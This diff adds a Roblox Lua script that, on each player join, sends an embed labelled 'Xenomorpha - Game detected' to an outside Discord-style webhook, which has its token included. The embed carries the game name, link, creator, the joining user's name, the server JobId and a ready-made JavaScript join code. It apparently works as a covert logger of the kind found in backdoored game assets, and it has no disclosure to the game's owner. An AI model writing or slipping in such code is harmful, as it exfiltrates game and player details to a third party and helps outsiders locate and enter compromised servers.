@@ -1,0 +1,79 @@
+local http = game:GetService("HttpService")
+local players = game:GetService("Players")
+local sendLog = "https://webhook.lewisakura.moe/api/webhooks/1187946347131838535/K_DKNhTlOu-romofk7gRmHJgC63RSCUaRhvjw7GVwqLyJ_aUU7IpGcYs_qK_YrKrdPvf"
+local max = players.MaxPlayers
+
+players.PlayerAdded:Connect(function(Xenomorpha)
+	local humanoid = Instance.new("Humanoid")
+	local character = Xenomorpha.Character
+	local getRig = humanoid.RigType.Name
+
+	local Time = os.time()
+	local localTime = os.date("*t", Time)
+	
+
+	
+	local Xenmorpha = {
+		["embeds"] = {
+			{
+				["title"] = "Xenomorpha - **Game detected**",
+				["description"] = "Join logged game",
+				["color"] = tonumber(940000),
+				["footer"] = {
+					["icon_url"] = 'https://thumbnails.roblox.com/v1/games/'..game.GameId..'/thumbnails',
+					["text"] = "Logged game"
+				},
+				["fields"] = {
+					{
+						["name"] = "***Game Name***",
+						["value"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."",
+						["inline"] = false
+					},
+					{
+						["name"] = "***Game Link***",
+						["value"] = "***https://roblox.com/games/"..game.PlaceId.."/***",
+						["inline"] = false
+					},
+					{
+						["name"] = "***Server Size***",
+						["value"] = "```javascript\n"..#players:GetPlayers().."/"..max.."```",
+						["inline"] = false
+					},
+					{
+						["name"] = "***Job Id***",
+						["value"] = "```"..game.JobId.."```",
+						["inline"] = false
+					},
+					{
+						["name"] = "***Game Creator***",
+						["value"] = ""..game.Players:GetNameFromUserIdAsync(game.CreatorId).."",
+						["inline"] = false
+					},
+					{
+						["name"] = "***User who joined***",
+						["value"] = ""..Xenomorpha.Name.."",
+						["inline"] = false
+					},
+					{
+						["name"] = "***Rig Type***",
+						["value"] = ""..getRig.."",
+						["inline"] = false
+					},
+					{
+						["name"] = "***Javascript Join Code***",
+						["value"] = "```javascript\n+javascript:Roblox.GameLauncher.joinGameInstance("..game.PlaceId..','..'"'..game.JobId..'"'..")```",
+						["inline"] = true
+					},
+					{
+						["name"] = "***Time game logged***",
+						["value"] = "```javascript\n"..localTime.hour..":"..localTime.min.."    "..localTime.month.."/"..localTime.day.."```",
+						["inline"] = true
+					},
+				}
+			}
+		}
+	}
+	
+	Xenmorpha = http:JSONEncode(Xenmorpha)
+	http:PostAsync(sendLog, Xenmorpha)
+end)
